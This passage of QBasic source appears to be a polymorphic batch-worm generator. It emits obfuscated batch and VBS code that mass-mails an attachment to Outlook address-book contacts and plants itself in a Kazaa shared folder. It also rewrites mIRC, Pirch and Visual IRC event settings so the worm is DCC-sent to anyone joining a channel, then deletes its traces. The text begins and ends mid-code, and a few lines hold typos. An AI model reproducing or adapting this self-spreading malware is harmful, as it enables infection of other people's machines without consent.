IF mp = 2 THEN PRINT #1, "echo Mail.to=ol.Get%VBSwayC%Space("; CHR$(34); "MAPI"; CHR$(34); ").AddressLists(1).AddressEntries(x) >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayC="
mp = INT(RND * 2) + 1
IF mp = 1 THEN PRINT #1, "echo Mail.Subject="; CHR$(34); OLSubject$; CHR$(34); " >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayK=Mail"
IF mp = 2 THEN PRINT #1, "echo %VBSwayK%.Subject="; CHR$(34); OLSubject$; CHR$(34); " >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayK="
mp = INT(RND * 2) + 1
IF mp = 1 THEN PRINT #1, "echo Mail.Body="; CHR$(34); OLBody$; CHR$(34); " >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayL=Body"
IF mp = 2 THEN PRINT #1, "echo Mail.%VBSwayL%="; CHR$(34); OLBody$; CHR$(34); " >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayL="
mp = INT(RND * 2) + 1
rand = INT(RND * 4) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set sendB=M"
IF rand = 1 THEN mail$ = "%sendB%ail"
IF rand = 2 THEN PRINT #1, ""; CC$; "set sendB=a"
IF rand = 2 THEN mail$ = "M%sendB%il"
IF rand = 3 THEN PRINT #1, ""; CC$; "set sendB=i"
IF rand = 3 THEN mail$ = "Ma%sendB%l"
IF rand = 4 THEN PRINT #1, ""; CC$; "set sendB=l"
IF rand = 4 THEN mail$ = "Mai%sendB%"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set attA=A"
IF rand = 1 THEN attA$ = "%attA%tt"
IF rand = 2 THEN PRINT #1, ""; CC$; "set attA=t"
IF rand = 2 THEN attA$ = "A%attA%t"
IF rand = 3 THEN PRINT #1, ""; CC$; "set attA=t"
IF rand = 3 THEN attA$ = "At%attA%"
rand = INT(RND * 4) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set attB=a"
IF rand = 1 THEN attB$ = "%attB%chm"
IF rand = 2 THEN PRINT #1, ""; CC$; "set attB=c"
IF rand = 2 THEN attB$ = "a%attB%hm"
IF rand = 3 THEN PRINT #1, ""; CC$; "set attB=h"
IF rand = 3 THEN attB$ = "ac%attB%m"
IF rand = 4 THEN PRINT #1, ""; CC$; "set attB=m"
IF rand = 4 THEN attB$ = "ach%attB%"
rand = INT(RND * 4) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set attC=e"
IF rand = 1 THEN attC$ = "%attC%nts"
IF rand = 2 THEN PRINT #1, ""; CC$; "set attC=n"
IF rand = 2 THEN attC$ = "e%attC%ts"
IF rand = 3 THEN PRINT #1, ""; CC$; "set attC=t"
IF rand = 3 THEN attC$ = "en%attC%s"
IF rand = 4 THEN PRINT #1, ""; CC$; "set attC=s"
IF rand = 4 THEN attC$ = "ent%attC%"
attach$ = attA$ + attB$ + attC$
PRINT #1, "goto mailrib"; CC$
PRINT #1, ""; CC$; "set sendB=k"
PRINT #1, ""; CC$; "set attA=b"
PRINT #1, ""; CC$; "set attB=n"
PRINT #1, ""; CC$; "set attC=a"
PRINT #1, ":mailrib"; CC$
IF mp = 1 THEN PRINT #1, "echo "; mail$; "."; attach$; ".Add("; CHR$(34); "C:\"; OLAttachment$; CHR$(34); ") >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayM="; attach$
IF mp = 2 THEN PRINT #1, "echo Mail.%VBSwayM%.Add("; CHR$(34); "C:\"; OLAttachment$; CHR$(34); ") >> C:\"; fina$; CC$
IF mp = 2 THEN PRINT #1, ""; CC$; "set VBSwayM="
mp = INT(RND * 2) + 1
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
send$ = a$ + B$ + c$ + d$ + e$
rand = INT(RND * 4) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set sendA=s"
IF rand = 1 THEN snd$ = "%sendA%end"
IF rand = 2 THEN PRINT #1, ""; CC$; "set sendA=e"
IF rand = 2 THEN snd$ = "s%sendA%nd"
IF rand = 3 THEN PRINT #1, ""; CC$; "set sendA=n"
IF rand = 3 THEN snd$ = "se%sendA%d"
IF rand = 4 THEN PRINT #1, ""; CC$; "set sendA=d"
IF rand = 4 THEN snd$ = "sen%sendA%"
rand = INT(RND * 4) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set sendB=M"
IF rand = 1 THEN mail$ = "%sendB%ail"
IF rand = 2 THEN PRINT #1, ""; CC$; "set sendB=a"
IF rand = 2 THEN mail$ = "M%sendB%il"
IF rand = 3 THEN PRINT #1, ""; CC$; "set sendB=i"
IF rand = 3 THEN mail$ = "Ma%sendB%l"
IF rand = 4 THEN PRINT #1, ""; CC$; "set sendB=l"
IF rand = 4 THEN mail$ = "Mai%sendB%"
PRINT #1, "echo "; mail$; "."; snd$; " >> C:\"; fina$; CC$
rand = INT(RND * 2) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set vsenda=N"
IF rand = 1 THEN nexta$ = "%vsenda%e"
IF rand = 2 THEN PRINT #1, ""; CC$; "set vsenda=e"
IF rand = 2 THEN nexta$ = "N%vsenda%"
rand = INT(RND * 2) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set vsendb=x"
IF rand = 1 THEN nextb$ = "%vsendb%t"
IF rand = 2 THEN PRINT #1, ""; CC$; "set vsendb=t"
IF rand = 2 THEN nextb$ = "x%vsendb%"
vnext$ = nexta$ + nextb$
PRINT #1, "goto emailri"; CC$
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
nexta$ = a$ + B$ + c$ + d$
nextb$ = a$ + B$ + c$
PRINT #1, ""; CC$; "set vsenda="; nexta$
PRINT #1, ""; CC$; "set vsendb="; nextb$
PRINT #1, ":emailri "; CC$; ""
PRINT #1, "echo "; vnext$; " >> C:\"; fina$; CC$
PRINT #1, ""; CC$; "set vsenda="
PRINT #1, ""; CC$; "set vsendb="
PRINT #1, "echo ol.Quit >> C:\"; fina$; CC$
GOTO VBSwayEnd
vbswayb:
GOTO VBSwayEnd
VBSwayEnd:
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
cscript$ = a$ + B$ + c$ + d$ + e$
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set cscA=scri"
IF rand = 1 THEN csc$ = "c%cscA%pt"
IF rand = 2 THEN PRINT #1, ""; CC$; "set cscA=csc"
IF rand = 2 THEN csc$ = "%cscA%ript"
IF rand = 3 THEN PRINT #1, ""; CC$; "set cscA=ipt"
IF rand = 3 THEN csc$ = "cscr%cscA%"
PRINT #1, "set "; cscript$; "="; csc$; CC$
PRINT #1, "%"; cscript$; "% C:\"; fina$; CC$
PRINT #1, "del C:\"; fina$; CC$
PRINT #1, "del C:\"; OLAttachment$; CC$
OLend:
IF kazza = 1 THEN GOTO KazzaA
GOTO KazzaAEnd
KazzaA:
rand = INT(RND * 2) + 1
PRINT #1, "copy "; MyS$; " C:\kazzad.vbs"; EE$
PRINT #1, "echo.on error resume next > C:\kazzad.vbs"; EE$
PRINT #1, "echo set ws = CreateObject("; CHR$(34); "wscript.shell"; CHR$(34); ") >> C:\kazzad.vbs"; EE$
IF rand = 1 THEN HKLM$ = "HK%kazaa%"
IF rand = 1 THEN PRINT #1, ""; EE$; "set kazaa=LM"
IF rand = 2 THEN HKLM$ = "%kazaa%LM"
IF rand = 2 THEN PRINT #1, ""; EE$; "set kazaa=HK"
PRINT #1, "goto kazari"; EE$
PRINT #1, ""; EE$; "set kazaa=AJ"
PRINT #1, ":kazari "; EE$
rand = INT(RND * 2) + 1
IF rand = 1 THEN kazaA$ = "Dl%kazab%"
IF rand = 1 THEN PRINT #1, ""; EE$; "set kazab=Dir0"
IF rand = 2 THEN kazaA$ = "%kazab%Dir0"
IF rand = 2 THEN PRINT #1, ""; EE$; "set kazab=Dl"
PRINT #1, "goto kazbri"; EE$
PRINT #1, ""; EE$; "set kazab=U6"
PRINT #1, ":kazbri "; EE$
rand = INT(RND * 2) + 1
IF rand = 1 THEN PRINT #1, ""; EE$; "set kazac=z"
IF rand = 1 THEN kazaB$ = "ka%kazac%aa"
IF rand = 2 THEN PRINT #1, ""; EE$; "set kazac=ka"
IF rand = 2 THEN PRINT #1, ""; EE$; "set kazad=aa"
IF rand = 2 THEN kazaB$ = "%kazac%z%kazad%"
PRINT #1, "goto kazcri"; EE$
PRINT #1, ""; EE$; "set kazac=Rt"
PRINT #1, ":kazcri "; EE$
PRINT #1, "echo ws.regwrite "; CHR$(34); ""; HKLM$; "\Software\"; kazaB$; "\Transfer\"; kazaA$; CHR$(34); ","; CHR$(34); "%windir%\kazaa\"; CHR$(34); " >> C:\kazzad.vbs"; EE$
PRINT #1, "cscript C:\kazzad.vbs"; EE$
PRINT #1, "del C:\kazzad.vbs"; EE$
PRINT #1, "md %windir%\kazaa"; EE$
PRINT #1, "copy %MyS% %windir%\kazaa\"; kazzaattachment$; EE$
PRINT #1, ""; EE$; "set kaza="
PRINT #1, ""; EE$; "set kazb="
PRINT #1, ""; EE$; "set kazc="
PRINT #1, ""; EE$; "set kazd="
KazzaAEnd:
IF mIRC = 1 THEN GOTO mir
GOTO IRCENDE
mir:
PRINT #1, "md C:\pro"; DD$
PRINT #1, "copy "; MyS$; " C:\pro\"; mIRCAttachment$; DD$
PRINT #1, "if exist C:\mirc\script.ini set mIRC=C:\mirc\script.ini"; DD$
PRINT #1, "if exist C:\mirc32\script.ini set mIRC=C:\mirc32\script.ini"; DD$
PRINT #1, "if exist C:\progra~1\mirc\script.ini set mIRC=C:\progra~1\mirc\script.ini"; DD$
PRINT #1, "if exist C:\progra~1\mirc32\script.ini set mIRC=C:\progra~1\mirc32\script.ini"; DD$
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
c$ = a$ + B$
PRINT #1, ""; DD$; "set spp="; c$
mirp = INT(RND * 3) + 1
IF mirp = 1 THEN PRINT #1, ""; DD$; "set spp=dcc send $nick C:\pro\"; mIRCAttachment$
IF mirp = 2 THEN PRINT #1, ""; DD$; "set ircc=send"; " % DDDD %"
IF mirp = 2 THEN PRINT #1, ""; DD$; "set spp=dcc %ircc% $nick C:\pro\"; mIRCAttachment$
IF mirp = 3 THEN PRINT #1, ""; DD$; "set ircc=nick"; " % DDDD %"
IF mirp = 3 THEN PRINT #1, ""; DD$; "set spp=dcc send $%ircc% C:\pro\"; mIRCAttachment$
PRINT #1, "goto mircri"; DD$
PRINT #1, ""; DD$; "set spp=kfhenv"
PRINT #1, ":mircri"; DD$
PRINT #1, "echo [script] > %mIRC%"; DD$
mirp = INT(RND * 5) + 1
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
c$ = a$ + B$
PRINT #1, ""; DD$; "set ircb="; c$
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
c$ = a$ + B$
oooz = INT(RND * 9) + 1
PRINT #1, ""; DD$; "set "; c$; "="; oooz
PRINT #1, ""; DD$; "set "; c$; "=1"
d$ = "%" + c$ + "%"
IF mirp = 1 THEN PRINT #1, ""; DD$; "set ircb=nick"
IF mirp = 1 THEN PRINT #1, "echo n0=on "; d$; ":join:*.*: { if ( $%ircb% !=$me ) /%spp% } >>%mIRC%"; DD$
IF mirp = 2 THEN PRINT #1, ""; DD$; "set ircb=jo"
IF mirp = 2 THEN PRINT #1, "echo n0=on "; d$; ":%ircb%in:*.*: { if ( $nick !=$me ) /%spp% } >>%mIRC%"; DD$
IF mirp = 3 THEN PRINT #1, ""; DD$; "set ircb=if"
IF mirp = 3 THEN PRINT #1, "echo n0=on "; d$; ":join:*.*: { %ircb% ( $nick !=$me ) /%spp% } >>%mIRC%"; DD$
IF mirp = 4 THEN PRINT #1, ""; DD$; "set ircb=in"
IF mirp = 4 THEN PRINT #1, "echo n0=on "; d$; ":jo%ircb%:*.*: { if ( $nick !=$me ) /%spp% } >>%mIRC%"; DD$
IF mirp = 5 THEN PRINT #1, ""; DD$; "set ircb=on"
IF mirp = 5 THEN PRINT #1, "echo n0=%ircb% "; d$; ":join:*.*: { if ( $nick !=$me ) /%spp% } >>%mIRC%"; DD$
PRINT #1, ""; DD$; "set ircb="
PRINT #1, ""; DD$; "set spp="
PRINT #1, ""; DD$; "set mIRC="
PRINT #1, ""; DD$; "set "; ooo$; "="
IRCENDE:
IF pirchb = 1 THEN GOTO PIRCH
GOTO PIRCHEND
REM pia-pie
PIRCH:
PRINT #1, "if exist C:\pirch98\events.ini goto pir"; EE$
PRINT #1, "goto pirend"; EE$
PRINT #1, ":pir"; EE$
PRINT #1, "copy "; MyS$; " %WinDir%\"; pIRChAttachment$; EE$
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo [Levels] > C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pif=Lev"
IF pip = 2 THEN PRINT #1, "echo [%pif%els] > C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pif="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo Enabled=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pig=able"
IF pip = 2 THEN PRINT #1, "echo En%pig%d=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pig="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo Count=6 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pih=Count"
IF pip = 2 THEN PRINT #1, "echo %pih%=6 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pih="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo Level1=000-Unknows >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pii=Unknows"
IF pip = 2 THEN PRINT #1, "echo Level1=000-%pii% >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pii="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo 000-UnknowsEnabled=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pij=wsEnab"
IF pip = 2 THEN PRINT #1, "echo 000-Unkno%pij%led=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pij="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo Level2=100-Level 100 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pik=evel2"
IF pip = 2 THEN PRINT #1, "echo L%pik%=100-Level 100 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pik="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo 100-Level 100Enabled=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pil=En"
IF pip = 2 THEN PRINT #1, "echo 100-Level 100%pil%abled=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pil="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo Level3=200-Level 200 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pim=ve"
IF pip = 2 THEN PRINT #1, "echo Le%pim%l3=200-Level 200 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pim="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo 200-Level 200Enabled=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pin=0Ena"
IF pip = 2 THEN PRINT #1, "echo 200-Level 20%pin%bled=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pin="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo Level4=300-Level 300 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pio=vel4"
IF pip = 2 THEN PRINT #1, "echo Le%pio%=300-Level 300 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pio="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo 300-Level 300Enabled=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pip=300"
IF pip = 2 THEN PRINT #1, "echo %pip%-Level 300Enabled=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pip="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo Level5=400-Level 400 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set piq=400"
IF pip = 2 THEN PRINT #1, "echo Level5=%piq%-Level 400 >> C:\Pirch98\events.ini"; EE$
IF piq = 2 THEN PRINT #1, ""; EE$; "set piq="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo 400-Level 400Enabled=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pir=0En"
IF pip = 2 THEN PRINT #1, "echo 400-Level 40%pir%abled=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pir="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo Level6=500-Level 500 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pis=Level6"
IF pip = 2 THEN PRINT #1, "echo L%pis%=500-Level 500 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pis="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo 500-Level 500Enabled=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pit=abled"
IF pip = 2 THEN PRINT #1, "echo 500-Level 500En%pit%=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pit="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo [000-Unknowns] >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pia=000"
IF pip = 2 THEN PRINT #1, "echo [%pia%-Unknowns] >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pia="
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo User1=*!*@* >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pib=Use"
IF pip = 2 THEN PRINT #1, "echo %pib%r1=*!*@* >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pib="
pip = INT(RND * 2)
IF pip = 1 THEN PRINT #1, "echo UserCount=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pic=erCo"
IF pip = 2 THEN PRINT #1, "echo Us%pic%unt=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pic="
rand = INT(RND * 4) + 1
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(RND)
c$ = a$ + B$
PRINT #1, "set pirchA="; c$; EE$
IF rand = 1 THEN PRINT #1, ""; EE$; "set pirchA=s"
IF rand = 1 THEN pirchset$ = "%pirchA%end"
IF rand = 2 THEN PRINT #1, ""; EE$; "set pirchA=e"
IF rand = 2 THEN pirchset$ = "s%pirchA%nd"
IF rand = 3 THEN PRINT #1, ""; EE$; "set pirchA=n"
IF rand = 3 THEN pirchset$ = "se%pirchA%d"
IF rand = 4 THEN PRINT #1, ""; EE$; "set pirchA=d"
IF rand = 4 THEN pirchset$ = "sen%pirchA%"
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(RND)
c$ = a$ + B$
PRINT #1, "set pirchB="; c$; EE$
PRINT #1, ""; EE$; "set pid=ON JOIN"
PRINT #1, "goto pirchri"; EE$
PRINT #1, ""; EE$; "set pid=jojo"
PRINT #1, ":pirchri"; EE$
PRINT #1, "echo Events1= %pid%:#: /dcc "; pirchset$; " $nick %WinDir%\"; pIRChAttachment$; " >> C:\Pirch98\events.ini"; EE$
pip = INT(RND * 2) + 1
IF pip = 1 THEN PRINT #1, "echo EventCount=1 >> C:\Pirch98\events.ini"; EE$
IF pip = 2 THEN PRINT #1, ""; EE$; "set pie=Event"
IF pip = 2 THEN PRINT #1, "echo %pie%Count=1 >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo [100-Level 100] >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo UserCount=0 >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo EventCount=0 >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo [200-Level 200] >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo UserCount=0 >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo EventCount=0 >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo [300-Level 300] >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo UserCount=0 >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo EventCount=0 >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo [400-Level 400] >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo UserCount=0 >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo EventCount=0 >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo [500-Level 500] >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo UserCount=0 >> C:\Pirch98\events.ini"; EE$
PRINT #1, "echo EventCount=0 >> C:\Pirch98\events.ini"; EE$
PRINT #1, ":pirend"; EE$
PIRCHEND:
IF vircB = 0 THEN GOTO VircEnd
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
vvbsname$ = a$ + B$ + c$ + d$ + e$ + ".vbs"
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
c$ = a$ + B$
PRINT #1, "set sendA="; c$; CC$
rand = INT(RND * 4) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set sendA=s"
IF rand = 1 THEN snd$ = "%sendA%end"
IF rand = 2 THEN PRINT #1, ""; CC$; "set sendA=e"
IF rand = 2 THEN snd$ = "s%sendA%nd"
IF rand = 3 THEN PRINT #1, ""; CC$; "set sendA=n"
IF rand = 3 THEN snd$ = "se%sendA%d"
IF rand = 4 THEN PRINT #1, ""; CC$; "set sendA=d"
IF rand = 4 THEN snd$ = "sen%sendA%"
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
PRINT #1, ""; CC$; "set vircA="; a$;
PRINT #1, "copy "; MyS$; " C:\Virc\"; vircattachment$; CC$
PRINT #1, "copy "; MyS$; " "; vvbsname$; CC$
PRINT #1, "echo.on error resume next >"; vvbsname$; CC$
rand = INT(RND * 4) + 1
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
c$ = a$ + B$
PRINT #1, ""; CC$; "set vircB="; c$
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
c$ = a$ + B$
PRINT #1, ""; CC$; "set vircC="; c$
IF rand = 1 THEN PRINT #1, ""; CC$; "set vircB=w"
IF rand = 1 THEN vircB$ = "%vircB%scr"
IF rand = 2 THEN PRINT #1, ""; CC$; "set vircB=s"
IF rand = 2 THEN vircB$ = "w%vircB%cr"
IF rand = 3 THEN PRINT #1, ""; CC$; "set vircB=c"
IF rand = 3 THEN vircB$ = "ws%vircB%r"
IF rand = 4 THEN PRINT #1, ""; CC$; "set vircB=r"
IF rand = 4 THEN vircB$ = "wsc%vircB%"
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set vircC=i"
IF rand = 1 THEN vircC$ = "%vircC%pt"
IF rand = 2 THEN PRINT #1, ""; CC$; "set vircC=p"
IF rand = 2 THEN vircC$ = "i%vircC%t"
IF rand = 3 THEN PRINT #1, ""; CC$; "set vircC=t"
IF rand = 3 THEN vircC$ = "ip%vircC%"
vircD$ = vircB$ + vircC$
PRINT #1, "echo set ws = CreateObject("; CHR$(34); vircD$; ".shell"; CHR$(34); ") >> "; vvbsname$; CC$
PRINT #1, ""; CC$; "set vircB="
PRINT #1, ""; CC$; "set vircC="
PRINT #1, ""; CC$; "set vircy=USER"
PRINT #1, "goto vircari"; CC$
PRINT #1, ""; CC$; "set vircy=kdsj"
PRINT #1, ":vircari"; CC$
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set vircA=dcc"
IF rand = 1 THEN PRINT #1, "goto vircri"; CC$
IF rand = 1 THEN PRINT #1, ""; CC$; "set vircA=kaj"
IF rand = 1 THEN PRINT #1, ":vircri"; CC$
IF rand = 1 THEN PRINT #1, "echo ws.regwrite "; CHR$(34); "HKEY_%vircy%\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17"; CHR$(34); ","; CHR$(34); "%vircA% "; snd$; " $nick C:\Virc\"; vircattachment$; " "; CHR$(34); " >>"; vvbsname$ _
; CC$
IF rand = 2 THEN PRINT #1, ""; CC$; "set vircA=MeGaLiTh"
IF rand = 2 THEN PRINT #1, "goto vircri"; CC$
IF rand = 2 THEN PRINT #1, ""; CC$; "set vircA=fhruz"
IF rand = 2 THEN PRINT #1, ":vircri"; CC$
IF rand = 2 THEN PRINT #1, "echo ws.regwrite "; CHR$(34); "HKEY_%vircy%\.Default\Software\%vircA% Software\Visual IRC 96\Events\Event17"; CHR$(34); ","; CHR$(34); "dcc "; snd$; " $nick C:\Virc\"; vircattachment$; " "; CHR$(34); " >>"; vvbsname$; CC$
IF rand = 3 THEN PRINT #1, ""; CC$; "set vircA=Software"
IF rand = 3 THEN PRINT #1, "goto vircri"; CC$
IF rand = 3 THEN PRINT #1, ""; CC$; "set vircA=lalala"
IF rand = 3 THEN PRINT #1, ":vircri"; CC$
IF rand = 3 THEN PRINT #1, "echo ws.regwrite "; CHR$(34); "HKEY_%vircy%\.Default\%vircA%\MeGaLiTh %vircA%\Visual IRC 96\Events\Event17"; CHR$(34); ","; CHR$(34); "dcc "; snd$; " $nick C:\Virc\"; vircattachment$; " "; CHR$(34); " >>"; vvbsname$; CC$
PRINT #1, ""; CC$; "set vircA="
PRINT #1, ""; CC$; "set sendA="
PRINT #1, ""; CC$; "set vircy="
rand = INT(RND * 3) + 1
IF rand = 1 THEN PRINT #1, ""; CC$; "set regiA=sc"
IF rand = 1 THEN regy$ = "c%regi%ript"
IF rand = 2 THEN PRINT #1, ""; CC$; "set regiA=rip"
IF rand = 2 THEN regy$ = "csc%regiA%t"
IF rand = 3 THEN PRINT #1, ""; CC$; "set regiA=csc"
IF rand = 3 THEN regy$ = "%regiA%ript"
PRINT #1, ""; regy$; " "; vvbsname$; CC$
PRINT #1, "del "; vvbsname$; CC$
PRINT #1, ""; CC$; "set regiA="
VircEnd:
IF RegFileI = 0 THEN GOTO RegFileEnd
ran = INT(RND * 26) + 97
a$ = CHR$(ran)
ran = INT(RND * 26) + 97
B$ = CHR$(ran)
ran = INT(RND * 26) + 97
c$ = CHR$(ran)
ran = INT(RND * 26) + 97
d$ = CHR$(ran)
ran = INT(RND * 26) + 97
e$ = CHR$(ran)
regwormfile$ = a$ + B$ + c$ + d$ + e$ + ".bat"
psyreg$ = "oqzbd.reg"
regpathname$ = "kfienq"
PRINT #1, "copy "; MyS$; " %windir%\"; regwormfile$; DD$
PRINT #1, "echo REGEDIT4 >"; psyreg$; DD$
IF rand = 1 THEN PRINT #1, ""; DD$; "set regA=S"
IF rand = 1 THEN regA$ = "%regA%oft"
IF rand = 2 THEN PRINT #1, ""; DD$; "set regA=o"
IF rand = 2 THEN regA$ = "S%regA%ft"
IF rand = 3 THEN PRINT #1, ""; DD$; "set regA=f"
IF rand = 3 THEN regA$ = "So%regAft"
IF rand = 4 THEN PRINT #1, ""; DD$; "set regA=t"
